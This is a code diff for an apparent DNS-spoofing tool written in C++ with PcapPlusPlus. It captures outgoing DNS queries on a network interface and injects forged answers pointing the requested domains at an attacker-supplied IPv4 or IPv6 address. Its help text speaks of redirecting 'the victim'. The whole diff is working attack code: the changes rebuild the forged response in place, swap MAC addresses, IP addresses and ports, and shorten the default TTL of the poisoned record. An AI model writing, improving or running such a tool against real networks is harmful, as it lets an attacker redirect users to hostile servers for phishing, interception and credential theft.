@@ -51,9 +51,10 @@ void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev
 {
     pcpp::Packet parsedPacket(packet);
 
-    std::optional<pcpp::Packet> poisonedPacket = std::nullopt;
+    pcpp::Packet poisonedPacket(packet);
 
-    pcpp::IPv4Layer *ipV4Layer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
+    pcpp::IPv4Layer *ipV4Layer = poisonedPacket.getLayerOfType<pcpp::IPv4Layer>();
+    bool wasPoisoned = false;
     if (ipV4Layer)
     {
         if (args.targets.hasTargets)
@@ -67,12 +68,11 @@ void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev
                 return;
         }
 
-        poisonedPacket = PoisonPacket(parsedPacket, true);
-        std::cout << "noppp" << std::endl;
+        wasPoisoned = PoisonPacket(parsedPacket, poisonedPacket, true);
     }
     else
     {
-        pcpp::IPv6Layer *ipV6Layer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
+        pcpp::IPv6Layer *ipV6Layer = poisonedPacket.getLayerOfType<pcpp::IPv6Layer>();
         if (!ipV6Layer)
             return;
 
@@ -87,38 +87,37 @@ void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev
                 return;
         }
 
-        poisonedPacket = std::move(PoisonPacket(parsedPacket, true));
+        wasPoisoned = PoisonPacket(parsedPacket, poisonedPacket, true);
     }
 
-    if (!poisonedPacket.has_value())
+    if (wasPoisoned)
     {
-        return;
-    }
+        if (!dev->sendPacket(&poisonedPacket))
+        {
+            Screen::SetColour(Screen::ForegroundColour::Red);
+            std::cerr << "Failed to send poisoned packet." << std::endl;
+            Screen::Reset();
+            return;
+        }
 
-    if (!dev->sendPacket(&poisonedPacket.value()))
-    {
-        Screen::SetColour(Screen::ForegroundColour::Red);
-        std::cerr << "Failed to send poisoned packet." << std::endl;
+        Screen::SetColour(Screen::ForegroundColour::Green);
+        std::cout << "Poisoned response sent." << std::endl;
         Screen::Reset();
-        return;
     }
-    
-    Screen::SetColour(Screen::ForegroundColour::Green);
-    std::cout << "Poisoned response sent." << std::endl;
-    Screen::Reset();
 
     return;
 }
 
-bool Program::PoisonPacket(const pcpp::Packet& original, pcpp::Packet& packet, bool isIPv4)
+bool Program::PoisonPacket(const pcpp::Packet &original, pcpp::Packet &packet, bool isIPv4)
 {
-    pcpp::DnsLayer* originalDns = original.getLayerOfType<pcpp::DnsLayer>();
-    if(!originalDns || originalDns->getDnsHeader()->numberOfAnswers != 0 || originalDns->getDnsHeader()->numberOfAuthority != 0 || originalDns->getDnsHeader()->numberOfAdditional != 0)
+    pcpp::DnsLayer *originalDns = original.getLayerOfType<pcpp::DnsLayer>();
+    if (!originalDns || originalDns->getDnsHeader()->numberOfAnswers != 0 || originalDns->getDnsHeader()->numberOfAuthority != 0 || originalDns->getDnsHeader()->numberOfAdditional != 0)
     { // the packet isn't a DNS one or is a retransmission / response packet)
         return false;
     }
-    pcpp::DnsLayer poisonDns(*originalDns);
-    
+
+    pcpp::DnsLayer *poisonDns = packet.getLayerOfType<pcpp::DnsLayer>();
+
     pcpp::DnsQuery *query = originalDns->getFirstQuery();
     while (query != nullptr)
     {
@@ -133,14 +132,14 @@ bool Program::PoisonPacket(const pcpp::Packet& original, pcpp::Packet& packet, b
                 {
                     pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                     // poisonDns.addQuery(query);
-                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                    poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                 }
             }
             else
             {
                 pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                 // poisonDns.addQuery(query);
-                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
             }
             break;
         }
@@ -155,14 +154,14 @@ bool Program::PoisonPacket(const pcpp::Packet& original, pcpp::Packet& packet, b
                 {
                     pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                     // poisonDns.addQuery(query);
-                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                    poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                 }
             }
             else
             {
                 pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                 // poisonDns.addQuery(query);
-                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
+                poisonDns->addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
             }
             break;
         }
@@ -174,65 +173,56 @@ bool Program::PoisonPacket(const pcpp::Packet& original, pcpp::Packet& packet, b
     }
 
     // If no queries were poisoned due to domain name restrictions, return none
-    if (poisonDns.getAnswerCount() == 0)
+    if (poisonDns->getAnswerCount() == 0)
     {
         return false;
     }
 
-    pcpp::Packet poison;
-
     // Poison Eth layer
-    pcpp::EthLayer *originalEth = original.getLayerOfType<pcpp::EthLayer>();
-    pcpp::EthLayer poisonEth(originalEth->getDestMac(), originalEth->getSourceMac());
-    poison.addLayer(&poisonEth, true);
+    pcpp::EthLayer *poisonEth = packet.getLayerOfType<pcpp::EthLayer>();
+    auto oldSourceMac = poisonEth->getSourceMac();
+    poisonEth->setSourceMac(poisonEth->getDestMac());
+    poisonEth->setDestMac(oldSourceMac);
 
     // Poison IP layer
-    pcpp::IPv4Layer *ipLayer = original.getLayerOfType<pcpp::IPv4Layer>();
-    pcpp::IPv4Layer poisonIP(*ipLayer);
 
-    auto oldSource = poisonIP.getSrcIPv4Address();
-    poisonIP.setSrcIPv4Address(ipLayer->getDstIPv4Address());
-    poisonIP.setDstIPv4Address(oldSource);
-    
     if (isIPv4)
     {
-        poison.addLayer(&poisonIP, true);
+        pcpp::IPv4Layer *poisonIP = packet.getLayerOfType<pcpp::IPv4Layer>();
+
+        auto oldSource = poisonIP->getSrcIPv4Address();
+        poisonIP->setSrcIPv4Address(poisonIP->getDstIPv4Address());
+        poisonIP->setDstIPv4Address(oldSource);
     }
     else
     {
-        pcpp::IPv6Layer *ipLayer = original.getLayerOfType<pcpp::IPv6Layer>();
-        pcpp::IPv6Layer poisonIP(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
-        poison.addLayer(&poisonIP, true);
+        pcpp::IPv6Layer *poisonIP = packet.getLayerOfType<pcpp::IPv6Layer>();
+
+        auto oldSource = poisonIP->getSrcIPv6Address();
+        poisonIP->setSrcIPv6Address(poisonIP->getDstIPv6Address());
+        poisonIP->setDstIPv6Address(oldSource);
     }
 
-    // _ZN7Program12PoisonPacketERN4pcpp6PacketEb: 0x0000000000012dff
     // Poison Transport layer
-    pcpp::UdpLayer *udpLayer = original.getLayerOfType<pcpp::UdpLayer>();
-    if (udpLayer)
+    pcpp::UdpLayer *poisonUdp = packet.getLayerOfType<pcpp::UdpLayer>();
+    if (poisonUdp)
     {
-        //pcpp::UdpLayer poisonUdp(*udpLayer);
-        //std::swap(poisonUdp.getUdpHeader()->portDst, poisonUdp.getUdpHeader()->portDst);
-        //poison.addLayer(&poisonUdp, true);
-
-        //pcpp::TcpLayer *tcpLayer = original.getLayerOfType<pcpp::TcpLayer>();
-        pcpp::TcpLayer poisonTcp(udpLayer->getUdpHeader()->portDst, udpLayer->getUdpHeader()->portSrc);
-        poison.addLayer(&poisonTcp);
+        std::swap(poisonUdp->getUdpHeader()->portSrc, poisonUdp->getUdpHeader()->portDst);
+        poisonUdp->calculateChecksum(true);
     }
     else
     {
-        pcpp::TcpLayer *tcpLayer = original.getLayerOfType<pcpp::TcpLayer>();
-        pcpp::TcpLayer poisonTcp(*tcpLayer);
-        std::swap(poisonTcp.getTcpHeader()->portDst, poisonTcp.getTcpHeader()->portDst);
-        poison.addLayer(&poisonTcp);
+        pcpp::TcpLayer *poisonTcp = packet.getLayerOfType<pcpp::TcpLayer>();
+        std::swap(poisonTcp->getTcpHeader()->portDst, poisonTcp->getTcpHeader()->portDst);
+        poisonTcp->calculateChecksum(true);
     }
 
     // Finish DNS poisoning
-    poisonDns.getDnsHeader()->transactionID = originalDns->getDnsHeader()->transactionID;
-    poisonDns.getDnsHeader()->queryOrResponse = 1;
-    poison.addLayer(&poisonDns);
+    //poisonDns->getDnsHeader()->transactionID = originalDns->getDnsHeader()->transactionID;
+    poisonDns->getDnsHeader()->queryOrResponse = 1;
 
-    poison.computeCalculateFields();
-    return poison;
+    packet.computeCalculateFields();
+    return true;
 }
 
 void Program::ParseArguments(int argc, char *argv[])
@@ -241,7 +231,7 @@ void Program::ParseArguments(int argc, char *argv[])
     parser.add_argument("-i", "--interface").required().help("Network interface to use");
     parser.add_argument("-b", "--bad-ip").required().help("IPv4 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
     parser.add_argument("-e", "--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
-    parser.add_argument("--ttl").default_value<uint32_t>(300).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
+    parser.add_argument("--ttl").default_value<uint32_t>(5).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
     parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");
     parser.add_argument("-p", "--port").help("The possible destination ports of outbound DNS queries [defualt: 53, 5353]");
 
@@ -336,7 +326,6 @@ void Program::ParseArguments(int argc, char *argv[])
         }
         catch (...)
         {
-
         }
 
         // Parse TTL
@@ -350,7 +339,6 @@ void Program::ParseArguments(int argc, char *argv[])
         }
 
         // Parse ports
-        
 
         if (errors.size() != 0)
         {
